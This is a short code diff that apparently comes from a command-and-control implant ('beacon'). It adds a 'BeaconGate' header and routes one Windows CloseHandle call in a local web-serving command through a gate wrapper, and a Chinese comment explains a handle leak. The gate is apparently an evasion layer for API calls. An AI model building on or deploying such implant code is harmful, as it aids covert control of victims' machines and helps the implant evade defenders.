@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include "beacon.h"
 #include "commands.h"
 #include "channel.h"
@@ -141,7 +142,7 @@ void serveit(unsigned short port, char * data, int length) {
 	sdata = serverdata_build(ServerSock, data, length);
 
 	/* 立即关掉自己的句柄副本（不影响线程运行）：否则每条 web 命令泄漏一个 */
-	CloseHandle(run_thread_start(&serveit_thread, (LPVOID)sdata));
+	gate_CloseHandle(run_thread_start(&serveit_thread, (LPVOID)sdata));
 }
 
 void command_webserver_local(char * buffer, int length) {
